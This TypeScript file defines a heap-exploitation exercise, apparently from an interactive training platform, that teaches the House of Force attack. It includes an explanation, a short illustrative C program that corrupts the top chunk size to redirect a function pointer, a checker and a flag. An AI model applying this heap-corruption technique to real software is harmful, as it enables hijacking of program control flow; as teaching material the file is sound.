import { Exercise } from '../types';

const ex22HouseForce: Exercise = {
  id: 'heap2-22',
  unitId: 'unit5-heap-ii',
  title: '22: House of Force',
  desc: 'The <strong>top chunk</strong> (wilderness) is the big chunk at the end of the heap that gets carved up by malloc. If you can overflow into the top chunk and set its size to <code>0xFFFFFFFF</code> (-1 in unsigned), the allocator thinks it has unlimited memory. Then a carefully calculated <code>malloc(evil_size)</code> moves the top chunk pointer to your target. The next allocation lands right on top of anything you want!',
  source: {
    c: [
      { text: '#include <stdio.h>', cls: '' },
      { text: '#include <stdlib.h>', cls: '' },
      { text: '', cls: '' },
      { text: 'void win() { printf("FLAG\\n"); }', cls: '' },
      { text: '', cls: '' },
      { text: 'void (**handler)();  // at 0x0804a040', cls: '' },
      { text: '', cls: '' },
      { text: 'int main() {', cls: '' },
      { text: '    char *a = malloc(16);', cls: '' },
      { text: '    // Overflow from a into top chunk header', cls: 'cmt' },
      { text: '    *(size_t*)(a+16) = 0;', cls: 'highlight' },
      { text: '    *(size_t*)(a+20) = 0xFFFFFFFF;', cls: 'highlight vuln' },
      { text: '    // Top chunk now thinks it\'s huge', cls: 'cmt' },
      { text: '    size_t evil = TARGET - top - 8;', cls: 'highlight' },
      { text: '    malloc(evil);  // moves top to target', cls: 'highlight' },
      { text: '    char *d = malloc(16);', cls: 'highlight' },
      { text: '    // d points to target!', cls: 'cmt' },
      { text: '    *(void**)d = win;', cls: 'highlight' },
      { text: '    (*handler)();', cls: 'highlight' },
      { text: '    return 0;', cls: '' },
      { text: '}', cls: '' },
    ],
  },
  mode: 'heap-house-force',
  vizMode: 'heap',
  heapSize: 512,
  showSymbols: true,
  showCalc: true,
  funcPtrAddr: 0x0804a040,
  check(_, heap, symbols) {
    return heap?.funcPtrs?.handler?.current === symbols.win;
  },
  winTitle: 'FLAG{house_of_force}',
  winMsg: 'By corrupting the top chunk size to -1 (0xFFFFFFFF), you told the allocator it has unlimited memory. Then a carefully calculated malloc moved the top chunk pointer to your target. The next allocation landed right on top of the function pointer table. This is the House of Force.',
};

export default ex22HouseForce;
